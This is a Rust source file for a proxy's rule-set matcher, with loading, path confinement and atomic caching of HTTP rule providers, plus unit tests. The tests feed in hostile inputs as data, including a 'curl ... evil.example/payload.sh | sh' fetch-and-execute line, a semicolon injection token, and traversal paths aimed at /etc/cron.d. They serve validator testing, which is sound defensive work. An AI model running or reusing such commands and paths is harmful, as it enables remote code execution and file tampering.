use std::{
    collections::{HashMap, HashSet},
    net::{IpAddr, SocketAddr},
    path::{Path, PathBuf},
    sync::Arc,
    time::Duration,
};

use ipnet::IpNet;
use rustls::pki_types::CertificateDer;
use serde::Deserialize;

use crate::{
    addr::TargetAddr,
    config::RuleProviderConfig,
    error::{ProxyError, Result},
    outbound::DynOutbound,
    platform::process::SocketTransport,
    router::{
        geodata::fetch_http_bytes_protected_with_proxy, mmdb::MmdbReader, rules::CompiledRule,
    },
};

#[derive(Deserialize)]
struct PayloadYaml {
    #[serde(default)]
    payload: Vec<String>,
}

fn merge_u32_ranges(mut ranges: Vec<(u32, u32)>) -> Vec<(u32, u32)> {
    if ranges.len() <= 1 {
        return ranges;
    }
    ranges.sort_unstable();
    let mut merged = Vec::with_capacity(ranges.len());
    let mut cur = ranges[0];
    for &(start, end) in &ranges[1..] {
        if start <= cur.1 || cur.1.checked_add(1) == Some(start) {
            cur.1 = cur.1.max(end);
        } else {
            merged.push(cur);
            cur = (start, end);
        }
    }
    merged.push(cur);
    merged
}

fn merge_u128_ranges(mut ranges: Vec<(u128, u128)>) -> Vec<(u128, u128)> {
    if ranges.len() <= 1 {
        return ranges;
    }
    ranges.sort_unstable();
    let mut merged = Vec::with_capacity(ranges.len());
    let mut cur = ranges[0];
    for &(start, end) in &ranges[1..] {
        if start <= cur.1 || cur.1.checked_add(1) == Some(start) {
            cur.1 = cur.1.max(end);
        } else {
            merged.push(cur);
            cur = (start, end);
        }
    }
    merged.push(cur);
    merged
}

#[inline]
fn contains_u32_range(ranges: &[(u32, u32)], val: u32) -> bool {
    let idx = ranges.partition_point(|&(start, _)| start <= val);
    idx > 0 && val <= ranges[idx - 1].1
}

#[inline]
fn contains_u128_range(ranges: &[(u128, u128)], val: u128) -> bool {
    let idx = ranges.partition_point(|&(start, _)| start <= val);
    idx > 0 && val <= ranges[idx - 1].1
}

/// Compiled `RULE-SET` matcher supporting Mihomo `domain`, `ipcidr`, and `classical` behaviors.
pub enum RuleSetMatcher {
    Domain {
        exact: HashSet<String>,
        suffixes: HashSet<String>,
        first_level_wildcards: HashSet<String>,
    },
    IpCidr {
        v4_ranges: Vec<(u32, u32)>,
        v6_ranges: Vec<(u128, u128)>,
    },
    Classical {
        rules: Vec<CompiledRule>,
    },
}

impl RuleSetMatcher {
    pub fn from_provider(
        name: &str,
        cfg: &RuleProviderConfig,
        mmdb: Option<&Arc<MmdbReader>>,
    ) -> Result<Self> {
        Self::from_provider_with_state_dir(name, cfg, mmdb, None)
    }

    pub fn from_provider_with_state_dir(
        name: &str,
        cfg: &RuleProviderConfig,
        mmdb: Option<&Arc<MmdbReader>>,
        state_dir: Option<&Path>,
    ) -> Result<Self> {
        let lines = load_provider_entries(name, cfg, state_dir)?;
        Self::compile(name, &cfg.behavior, &lines, mmdb)
    }

    pub fn compile(
        name: &str,
        behavior: &str,
        entries: &[String],
        mmdb: Option<&Arc<MmdbReader>>,
    ) -> Result<Self> {
        match behavior.trim().to_ascii_lowercase().as_str() {
            "domain" => {
                let mut exact = HashSet::new();
                let mut suffixes = HashSet::new();
                let mut first_level_wildcards = HashSet::new();
                let mut saw_non_comment = false;
                let mut valid_count = 0usize;

                for raw in entries {
                    let s = raw.trim().trim_matches('\'').trim_matches('"');
                    if s.is_empty() || s.starts_with('#') || s.starts_with("//") {
                        continue;
                    }
                    saw_non_comment = true;
                    if !is_safe_ruleset_domain_token(s) {
                        continue;
                    }
                    let lower = s.trim_end_matches('.').to_ascii_lowercase();
                    if let Some(suf) = lower.strip_prefix("+.") {
                        if is_valid_ruleset_domain_body(suf) {
                            suffixes.insert(suf.to_string());
                            valid_count += 1;
                        }
                    } else if let Some(suf) = lower.strip_prefix('.') {
                        if is_valid_ruleset_domain_body(suf) {
                            suffixes.insert(suf.to_string());
                            valid_count += 1;
                        }
                    } else if let Some(suf) = lower.strip_prefix("*.") {
                        if is_valid_ruleset_domain_body(suf) {
                            first_level_wildcards.insert(suf.to_string());
                            valid_count += 1;
                        }
                    } else if is_valid_ruleset_domain_body(&lower) {
                        exact.insert(lower);
                        valid_count += 1;
                    }
                }
                if saw_non_comment && valid_count == 0 {
                    return Err(ProxyError::Config(format!(
                        "rule-provider '{name}' contained no valid domain entries"
                    )));
                }
                Ok(Self::Domain {
                    exact,
                    suffixes,
                    first_level_wildcards,
                })
            }
            "ipcidr" => {
                let mut v4_raw = Vec::new();
                let mut v6_raw = Vec::new();
                for raw in entries {
                    let s = raw.trim().trim_matches('\'').trim_matches('"');
                    if s.is_empty() || s.starts_with('#') || s.starts_with("//") {
                        continue;
                    }
                    let token = s.split('#').next().unwrap_or(s).trim();
                    let net: IpNet = token
                        .parse::<IpNet>()
                        .or_else(|e| token.parse::<IpAddr>().map(IpNet::from).map_err(|_| e))
                        .map_err(|e| {
                            ProxyError::Config(format!(
                                "rule-provider '{name}' invalid ipcidr entry '{s}': {e}"
                            ))
                        })?;
                    match net {
                        IpNet::V4(v4) => {
                            v4_raw.push((u32::from(v4.network()), u32::from(v4.broadcast())));
                        }
                        IpNet::V6(v6) => {
                            v6_raw.push((u128::from(v6.network()), u128::from(v6.broadcast())));
                        }
                    }
                }
                Ok(Self::IpCidr {
                    v4_ranges: merge_u32_ranges(v4_raw),
                    v6_ranges: merge_u128_ranges(v6_raw),
                })
            }
            "classical" => {
                let mut rules = Vec::with_capacity(entries.len());
                for raw in entries {
                    let s = raw.trim().trim_matches('\'').trim_matches('"');
                    if s.is_empty() || s.starts_with('#') || s.starts_with("//") {
                        continue;
                    }
                    // Classical rule-set entries have `TYPE,PAYLOAD[,no-resolve]` (no target column);
                    // synthesize a dummy `,RULE-SET-HIT` target so `CompiledRule::parse_with_context` compiles them!
                    let parts_count = s.split(',').count();
                    let normalized_line = if s.eq_ignore_ascii_case("MATCH") {
                        "MATCH,RULE-SET-HIT".to_string()
                    } else if parts_count == 2 {
                        format!("{s},RULE-SET-HIT")
                    } else if parts_count == 3 {
                        let mut it = s.split(',');
                        let t = it.next().unwrap_or("");
                        let p = it.next().unwrap_or("");
                        let third = it.next().unwrap_or("").trim();
                        if third.eq_ignore_ascii_case("no-resolve") {
                            format!("{t},{p},RULE-SET-HIT,no-resolve")
                        } else {
                            s.to_string()
                        }
                    } else {
                        s.to_string()
                    };
                    match CompiledRule::parse_with_context(&normalized_line, mmdb, None) {
                        Ok(compiled) => rules.push(compiled),
                        Err(e) => {
                            tracing::debug!(
                                "skipping unsupported classical rule in provider '{name}': {e}"
                            );
                        }
                    }
                }
                Ok(Self::Classical { rules })
            }
            other => Err(ProxyError::Config(format!(
                "rule-provider '{name}' specifies unsupported behavior '{other}' (expected 'domain', 'ipcidr', or 'classical')"
            ))),
        }
    }

    pub fn requires_ip_resolution(&self, outer_no_resolve: bool) -> bool {
        if outer_no_resolve {
            return false;
        }
        match self {
            Self::Domain { .. } => false,
            Self::IpCidr { .. } => true,
            Self::Classical { rules } => rules.iter().any(CompiledRule::requires_ip_resolution),
        }
    }

    #[inline]
    fn ip_matches_ranges(v4_ranges: &[(u32, u32)], v6_ranges: &[(u128, u128)], ip: IpAddr) -> bool {
        match ip {
            IpAddr::V4(v4) => contains_u32_range(v4_ranges, u32::from(v4)),
            IpAddr::V6(v6) => {
                if contains_u128_range(v6_ranges, u128::from(v6)) {
                    return true;
                }
                if let Some(mapped_v4) = v6.to_ipv4_mapped() {
                    return contains_u32_range(v4_ranges, u32::from(mapped_v4));
                }
                false
            }
        }
    }

    pub fn matches(
        &self,
        src_ip: Option<IpAddr>,
        src_addr: Option<SocketAddr>,
        transport: SocketTransport,
        target: &TargetAddr,
        resolved_ips: &[IpAddr],
        outer_no_resolve: bool,
    ) -> bool {
        match self {
            Self::Domain {
                exact,
                suffixes,
                first_level_wildcards,
            } => {
                let Some(raw_domain) = target.host.as_domain() else {
                    return false;
                };
                let d = raw_domain.trim().trim_end_matches('.').to_ascii_lowercase();
                if exact.contains(&d) {
                    return true;
                }
                let mut cursor = d.as_str();
                loop {
                    if suffixes.contains(cursor) {
                        return true;
                    }
                    match cursor.split_once('.') {
                        Some((_, rest)) if !rest.is_empty() => cursor = rest,
                        _ => break,
                    }
                }
                if let Some((first, rest)) = d.split_once('.')
                    && !first.is_empty()
                    && first_level_wildcards.contains(rest)
                {
                    return true;
                }
                false
            }
            Self::IpCidr {
                v4_ranges,
                v6_ranges,
            } => {
                if let Some(ip) = target.host.as_ip() {
                    Self::ip_matches_ranges(v4_ranges, v6_ranges, ip)
                } else if !outer_no_resolve {
                    resolved_ips
                        .iter()
                        .copied()
                        .any(|ip| Self::ip_matches_ranges(v4_ranges, v6_ranges, ip))
                } else {
                    false
                }
            }
            Self::Classical { rules } => {
                let ips = if outer_no_resolve { &[] } else { resolved_ips };
                rules
                    .iter()
                    .any(|r| r.matches_full(src_ip, src_addr, transport, target, ips))
            }
        }
    }
}

fn is_safe_ruleset_domain_token(raw: &str) -> bool {
    !raw.is_empty()
        && !raw.chars().any(|c| {
            c.is_whitespace()
                || c.is_ascii_control()
                || matches!(
                    c,
                    '/' | '\\' | ';' | '|' | '&' | '$' | '`' | '<' | '>' | ':'
                )
        })
}

fn is_valid_ruleset_domain_body(body: &str) -> bool {
    !body.is_empty()
        && !body.starts_with('.')
        && !body.contains("..")
        && !body.contains('*')
        && !body.contains('+')
        && is_safe_ruleset_domain_token(body)
}

pub fn default_http_provider_cache_path(state_dir: &Path, name: &str, format: &str) -> PathBuf {
    let sanitized: String = name
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || c == '-' || c == '_' {
                c
            } else {
                '_'
            }
        })
        .collect();
    let ext = if format.trim().eq_ignore_ascii_case("text") {
        "txt"
    } else {
        "yaml"
    };
    state_dir
        .join("rulesets")
        .join(format!("{sanitized}.{ext}"))
}

fn normalize_relative_http_provider_subpath(name: &str, raw_path: &str) -> Result<PathBuf> {
    if raw_path.chars().any(|c| c.is_control()) {
        return Err(ProxyError::Config(format!(
            "http rule-provider '{name}' path contains control or null bytes"
        )));
    }
    let trimmed = raw_path.trim();
    if trimmed.is_empty() {
        return Err(ProxyError::Config(format!(
            "http rule-provider '{name}' path is whitespace-only"
        )));
    }
    let p = Path::new(trimmed);
    if Path::new(raw_path).is_absolute()
        || p.is_absolute()
        || trimmed.starts_with('/')
        || trimmed.starts_with('\\')
        || (trimmed.len() >= 2
            && trimmed.as_bytes()[0].is_ascii_alphabetic()
            && trimmed.as_bytes()[1] == b':')
        || raw_path.split(['/', '\\']).any(|seg| seg == "..")
    {
        return Err(ProxyError::Config(format!(
            "http rule-provider '{name}' path '{raw_path}' must be a confined relative path"
        )));
    }

    let mut clean = PathBuf::new();
    for comp in p.components() {
        match comp {
            std::path::Component::CurDir => {}
            std::path::Component::Normal(seg) => {
                let seg_str = seg.to_str().ok_or_else(|| {
                    ProxyError::Config(format!(
                        "http rule-provider '{name}' path contains non-UTF-8 segment"
                    ))
                })?;
                if seg_str.is_empty()
                    || seg_str == "."
                    || seg_str == ".."
                    || seg_str.contains('\\')
                    || seg_str.chars().any(|c| c.is_control())
                {
                    return Err(ProxyError::Config(format!(
                        "http rule-provider '{name}' path contains invalid segment '{seg_str}'"
                    )));
                }
                clean.push(seg_str);
            }
            std::path::Component::ParentDir
            | std::path::Component::RootDir
            | std::path::Component::Prefix(_) => {
                return Err(ProxyError::Config(format!(
                    "http rule-provider '{name}' path '{raw_path}' escapes ruleset directory"
                )));
            }
        }
    }
    if clean.as_os_str().is_empty() {
        return Err(ProxyError::Config(format!(
            "http rule-provider '{name}' path '{raw_path}' has no normal path component"
        )));
    }
    Ok(clean)
}

fn canonicalize_with_missing_tail(path: &Path) -> std::io::Result<PathBuf> {
    let mut missing = Vec::new();
    let mut cur = path;
    loop {
        if cur.exists() {
            let mut base = std::fs::canonicalize(cur)?;
            for part in missing.into_iter().rev() {
                base.push(part);
            }
            return Ok(base);
        }
        let Some(name) = cur.file_name() else {
            return std::fs::canonicalize(path);
        };
        missing.push(name.to_os_string());
        let Some(parent) = cur.parent() else {
            return std::fs::canonicalize(path);
        };
        cur = parent;
    }
}

/// Resolves an `http` rule-provider cache file strictly inside `state_dir/rulesets`,
/// rejecting absolute paths, `..` traversal, control characters, and symlink escapes.
pub fn resolve_confined_http_provider_path(
    state_dir: &Path,
    name: &str,
    configured_path: Option<&str>,
    format: &str,
) -> Result<PathBuf> {
    if let Some(raw) = configured_path
        && raw.chars().any(|c| c.is_control())
    {
        return Err(ProxyError::Config(format!(
            "http rule-provider '{name}' path contains control or null bytes"
        )));
    }

    let candidate = match configured_path {
        None | Some("") => default_http_provider_cache_path(state_dir, name, format),
        Some(raw) => {
            let clean = normalize_relative_http_provider_subpath(name, raw)?;
            let under_rulesets = match clean.strip_prefix("rulesets") {
                Ok(stripped) if !stripped.as_os_str().is_empty() => stripped.to_path_buf(),
                _ => clean,
            };
            state_dir.join("rulesets").join(under_rulesets)
        }
    };

    let canon_state_dir = canonicalize_with_missing_tail(state_dir).map_err(|e| {
        ProxyError::Config(format!(
            "failed resolving state_dir '{}' for rule-provider '{name}': {e}",
            state_dir.display()
        ))
    })?;

    let rel_from_state = candidate.strip_prefix(state_dir).map_err(|_| {
        ProxyError::Config(format!(
            "http rule-provider '{name}' path escaped state_dir"
        ))
    })?;

    let mut cur = state_dir.to_path_buf();
    for comp in rel_from_state.components() {
        cur.push(comp.as_os_str());
        match std::fs::symlink_metadata(&cur) {
            Ok(meta) => {
                if meta.file_type().is_symlink() {
                    return Err(ProxyError::Config(format!(
                        "refusing symlink component '{}' in http rule-provider '{name}' cache path",
                        cur.display()
                    )));
                }
                let canon_cur = std::fs::canonicalize(&cur).map_err(|e| {
                    ProxyError::Config(format!(
                        "failed canonicalizing '{}' for rule-provider '{name}': {e}",
                        cur.display()
                    ))
                })?;
                if !canon_cur.starts_with(&canon_state_dir) {
                    return Err(ProxyError::Config(format!(
                        "http rule-provider '{name}' path '{}' escapes state_dir",
                        cur.display()
                    )));
                }
            }
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => break,
            Err(e) => {
                return Err(ProxyError::Config(format!(
                    "failed inspecting '{}' for rule-provider '{name}': {e}",
                    cur.display()
                )));
            }
        }
    }

    let canon_parent = candidate
        .parent()
        .ok_or_else(|| ProxyError::Config(format!("invalid cache path for '{name}'")))
        .and_then(|parent| {
            canonicalize_with_missing_tail(parent).map_err(|e| {
                ProxyError::Config(format!(
                    "failed canonicalizing parent '{}' for '{name}': {e}",
                    parent.display()
                ))
            })
        })?;
    if !canon_parent.starts_with(&canon_state_dir) {
        return Err(ProxyError::Config(format!(
            "http rule-provider '{name}' parent directory escapes state_dir"
        )));
    }

    Ok(candidate)
}

fn load_provider_entries(
    name: &str,
    cfg: &RuleProviderConfig,
    state_dir: Option<&Path>,
) -> Result<Vec<String>> {
    let ptype = cfg.provider_type.trim().to_ascii_lowercase();
    match ptype.as_str() {
        "inline" => Ok(cfg.payload.clone()),
        "file" => {
            let path_str = cfg.path.as_deref().ok_or_else(|| {
                ProxyError::Config(format!("file rule-provider '{name}' requires 'path'"))
            })?;
            if path_str.chars().any(|c| c.is_control())
                || Path::new(path_str)
                    .components()
                    .any(|c| matches!(c, std::path::Component::ParentDir))
                || path_str.split(['/', '\\']).any(|seg| seg == "..")
            {
                return Err(ProxyError::Config(format!(
                    "file rule-provider '{name}' path contains forbidden traversal or control bytes"
                )));
            }
            read_provider_file(name, Path::new(path_str), &cfg.format)
        }
        "http" => {
            if let Some(ref raw_path) = cfg.path
                && !raw_path.is_empty()
            {
                let _ = normalize_relative_http_provider_subpath(name, raw_path)?;
            }
            if let Some(dir) = state_dir {
                let confined_cache = resolve_confined_http_provider_path(
                    dir,
                    name,
                    cfg.path.as_deref(),
                    &cfg.format,
                )?;
                if confined_cache.is_file()
                    && let Ok(entries) = read_provider_file(name, &confined_cache, &cfg.format)
                {
                    return Ok(entries);
                }
                let fallback_cache =
                    resolve_confined_http_provider_path(dir, name, None, &cfg.format)?;
                if fallback_cache != confined_cache
                    && fallback_cache.is_file()
                    && let Ok(entries) = read_provider_file(name, &fallback_cache, &cfg.format)
                {
                    return Ok(entries);
                }
            }
            if !cfg.payload.is_empty() {
                return Ok(cfg.payload.clone());
            }
            if cfg.url.as_deref().unwrap_or("").trim().is_empty() {
                return Err(ProxyError::Config(format!(
                    "http rule-provider '{name}' requires 'url'"
                )));
            }
            // Allow startup with empty initial set until async provider refresh populates cache
            Ok(Vec::new())
        }
        other => Err(ProxyError::Config(format!(
            "rule-provider '{name}' has unsupported type '{other}' (expected 'inline', 'file', or 'http')"
        ))),
    }
}

fn parse_provider_raw_str(name: &str, raw: &str, format: &str) -> Result<Vec<String>> {
    let cleaned = crate::config::uri::trim_bom_and_controls(raw);
    if format.trim().eq_ignore_ascii_case("text") {
        Ok(cleaned
            .lines()
            .map(str::trim)
            .filter(|l| !l.is_empty() && !l.starts_with('#') && !l.starts_with("//"))
            .map(ToString::to_string)
            .collect())
    } else {
        let mut val = crate::config::parse_yaml_value_with_merges(cleaned).map_err(|e| {
            ProxyError::Config(format!("failed parsing YAML rule-provider '{name}': {e}"))
        })?;
        if let serde_json::Value::Object(ref mut m) = val
            && let Some(p) = m.get_mut("payload")
            && let serde_json::Value::Array(seq) = p
        {
            seq.retain(|v| !v.is_null());
        }
        let parsed: PayloadYaml = serde_json::from_value(val).map_err(|e| {
            ProxyError::Config(format!("failed parsing YAML rule-provider '{name}': {e}"))
        })?;
        Ok(parsed.payload)
    }
}

fn read_provider_file(name: &str, path: &Path, format: &str) -> Result<Vec<String>> {
    let raw = std::fs::read_to_string(path).map_err(|e| {
        ProxyError::Config(format!(
            "failed reading rule-provider '{name}' file '{}': {e}",
            path.display()
        ))
    })?;
    parse_provider_raw_str(name, &raw, format)
}

pub fn build_rule_sets(
    providers: &HashMap<String, RuleProviderConfig>,
    mmdb: Option<&Arc<MmdbReader>>,
) -> Result<HashMap<String, Arc<RuleSetMatcher>>> {
    build_rule_sets_with_state_dir(providers, mmdb, None)
}

pub fn build_rule_sets_with_state_dir(
    providers: &HashMap<String, RuleProviderConfig>,
    mmdb: Option<&Arc<MmdbReader>>,
    state_dir: Option<&Path>,
) -> Result<HashMap<String, Arc<RuleSetMatcher>>> {
    let mut map = HashMap::with_capacity(providers.len());
    for (name, cfg) in providers {
        let matcher = RuleSetMatcher::from_provider_with_state_dir(name, cfg, mmdb, state_dir)?;
        map.insert(name.clone(), Arc::new(matcher));
    }
    Ok(map)
}

fn write_confined_ruleset_atomic(
    state_dir: &Path,
    name: &str,
    configured_path: Option<&str>,
    format: &str,
    bytes: &[u8],
) -> Result<()> {
    let target_path =
        resolve_confined_http_provider_path(state_dir, name, configured_path, format)?;
    let parent = target_path.parent().ok_or_else(|| {
        ProxyError::Config(format!("rule-provider '{name}' cache path has no parent"))
    })?;
    std::fs::create_dir_all(parent).map_err(|e| {
        ProxyError::Config(format!(
            "failed creating ruleset cache dir '{}': {e}",
            parent.display()
        ))
    })?;
    // Re-verify canonical confinement after directory creation to close TOCTOU / symlink races.
    let verified_target =
        resolve_confined_http_provider_path(state_dir, name, configured_path, format)?;
    let tmp_path = verified_target.with_extension(format!("tmp.{}", std::process::id()));
    if let Ok(meta) = std::fs::symlink_metadata(&tmp_path)
        && meta.file_type().is_symlink()
    {
        return Err(ProxyError::Config(format!(
            "refusing symlink temporary ruleset path '{}'",
            tmp_path.display()
        )));
    }
    {
        use std::io::Write;
        let mut opts = std::fs::OpenOptions::new();
        opts.create(true).write(true).truncate(true);
        #[cfg(unix)]
        {
            use std::os::unix::fs::OpenOptionsExt;
            opts.mode(0o600);
        }
        let mut file = opts.open(&tmp_path).map_err(|e| {
            ProxyError::Config(format!(
                "failed opening ruleset temp file '{}': {e}",
                tmp_path.display()
            ))
        })?;
        file.write_all(bytes).map_err(|e| {
            ProxyError::Config(format!(
                "failed writing ruleset temp file '{}': {e}",
                tmp_path.display()
            ))
        })?;
        let _ = file.sync_all();
    }
    std::fs::rename(&tmp_path, &verified_target).map_err(|e| {
        let _ = std::fs::remove_file(&tmp_path);
        ProxyError::Config(format!(
            "failed renaming ruleset cache '{}': {e}",
            verified_target.display()
        ))
    })
}

/// Asynchronously refresh any due `http` `rule-providers` into their confined
/// `<state_dir>/rulesets/` cache using protected direct + fallback-proxy HTTPS fetch.
/// Returns the number of providers whose on-disk cache was updated.
pub async fn refresh_http_rule_providers(
    providers: &HashMap<String, RuleProviderConfig>,
    state_dir: &Path,
    extra_ca_der: &[CertificateDer<'static>],
    fallback_proxy: Option<&DynOutbound>,
    force: bool,
) -> usize {
    let mut updated = 0usize;
    for (name, cfg) in providers {
        if !cfg.provider_type.trim().eq_ignore_ascii_case("http") {
            continue;
        }
        let Some(url) = cfg.url.as_deref().map(str::trim).filter(|u| !u.is_empty()) else {
            continue;
        };
        let target_path = match resolve_confined_http_provider_path(
            state_dir,
            name,
            cfg.path.as_deref(),
            &cfg.format,
        ) {
            Ok(p) => p,
            Err(e) => {
                tracing::warn!(
                    "skipping http rule-provider '{name}' due to unsafe cache path: {e}"
                );
                continue;
            }
        };

        if !force
            && let Ok(meta) = std::fs::metadata(&target_path)
            && let Ok(modified) = meta.modified()
            && let Ok(age) = modified.elapsed()
            && age < Duration::from_secs(cfg.interval.max(60))
        {
            continue;
        }

        let Ok(bytes) =
            fetch_http_bytes_protected_with_proxy(url, extra_ca_der, fallback_proxy).await
        else {
            continue;
        };
        let Ok(raw_text) = String::from_utf8(bytes) else {
            continue;
        };
        let Ok(entries) = parse_provider_raw_str(name, &raw_text, &cfg.format) else {
            continue;
        };
        if RuleSetMatcher::compile(name, &cfg.behavior, &entries, None).is_err() {
            continue;
        }
        if let Err(e) = write_confined_ruleset_atomic(
            state_dir,
            name,
            cfg.path.as_deref(),
            &cfg.format,
            raw_text.as_bytes(),
        ) {
            tracing::warn!("failed caching http rule-provider '{name}': {e}");
            continue;
        }
        updated += 1;
    }
    updated
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn ipcidr_ruleset_merges_and_binary_searches_ipv4_and_ipv6_ranges() {
        let entries = vec![
            "10.0.0.0/25".to_string(),
            "10.0.0.128/25".to_string(), // Adjacent -> merges into 10.0.0.0/24
            "10.0.0.64/26".to_string(),  // Overlapping subset
            "192.168.50.9/32".to_string(),
            "2001:db8:abcd::/49".to_string(),
            "2001:db8:abcd:8000::/49".to_string(), // Adjacent -> merges into /48
        ];
        let matcher = RuleSetMatcher::compile("test-cidr", "ipcidr", &entries, None).unwrap();
        let RuleSetMatcher::IpCidr {
            ref v4_ranges,
            ref v6_ranges,
        } = matcher
        else {
            panic!("expected IpCidr matcher");
        };
        assert_eq!(v4_ranges.len(), 2);
        assert_eq!(v6_ranges.len(), 1);

        let check = |ip_str: &str| {
            let target = TargetAddr::new_ip(ip_str.parse().unwrap(), 443);
            matcher.matches(None, None, SocketTransport::Tcp, &target, &[], false)
        };
        assert!(check("10.0.0.1"));
        assert!(check("10.0.0.254"));
        assert!(!check("10.0.1.1"));
        assert!(check("192.168.50.9"));
        assert!(!check("192.168.50.10"));
        assert!(check("2001:db8:abcd:ffff::1"));
        assert!(!check("2001:db8:abce::1"));
    }

    #[test]
    fn confined_http_provider_path_rejects_traversal_absolute_and_symlinks() {
        let tmp = std::env::temp_dir().join(format!("rc-ruleset-test-{}", uuid::Uuid::new_v4()));
        let state_dir = tmp.join("state");
        std::fs::create_dir_all(state_dir.join("rulesets")).expect("create state_dir");

        let ok_default =
            resolve_confined_http_provider_path(&state_dir, "ads", None, "yaml").expect("default");
        assert!(ok_default.starts_with(state_dir.join("rulesets")));

        let ok_rel = resolve_confined_http_provider_path(
            &state_dir,
            "ads",
            Some("./rulesets/custom/ads.yaml"),
            "yaml",
        )
        .expect("relative");
        assert_eq!(ok_rel, state_dir.join("rulesets/custom/ads.yaml"));

        assert!(
            resolve_confined_http_provider_path(&state_dir, "ads", Some("/etc/cron.d/pwn"), "yaml")
                .is_err()
        );
        assert!(
            resolve_confined_http_provider_path(&state_dir, "ads", Some("../../pwn.yaml"), "yaml")
                .is_err()
        );
        assert!(
            resolve_confined_http_provider_path(&state_dir, "ads", Some("bad\0name.yaml"), "yaml")
                .is_err()
        );

        #[cfg(unix)]
        {
            let outside = tmp.join("outside");
            std::fs::create_dir_all(&outside).expect("outside dir");
            std::os::unix::fs::symlink(&outside, state_dir.join("rulesets/escape"))
                .expect("symlink");
            assert!(
                resolve_confined_http_provider_path(
                    &state_dir,
                    "ads",
                    Some("escape/pwn.yaml"),
                    "yaml"
                )
                .is_err()
            );
        }

        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[test]
    fn domain_ruleset_rejects_html_and_shell_garbage_and_skips_bad_tokens() {
        let html_lines = vec![
            "<!DOCTYPE html>".to_string(),
            "<html><body>502 Bad Gateway</body></html>".to_string(),
            "curl https://evil.example/payload.sh | sh".to_string(),
        ];
        assert!(RuleSetMatcher::compile("bad-html", "domain", &html_lines, None).is_err());

        let mixed_lines = vec![
            "# comment".to_string(),
            "+.example.com".to_string(),
            "*.cdn.example.org".to_string(),
            "bad;inject.com".to_string(),
            "https://not-a-domain.example/path".to_string(),
        ];
        let matcher =
            RuleSetMatcher::compile("mixed", "domain", &mixed_lines, None).expect("mixed valid");
        let RuleSetMatcher::Domain {
            ref exact,
            ref suffixes,
            ref first_level_wildcards,
        } = matcher
        else {
            panic!("expected Domain matcher");
        };
        assert!(exact.is_empty());
        assert_eq!(suffixes.len(), 1);
        assert_eq!(first_level_wildcards.len(), 1);

        let check_dom = |host: &str| {
            let target = TargetAddr::new_domain(host, 443).expect("valid domain");
            matcher.matches(None, None, SocketTransport::Tcp, &target, &[], false)
        };
        assert!(check_dom("sub.example.com"));
        assert!(check_dom("img.cdn.example.org"));
        assert!(!check_dom("other.example.net"));
    }
}
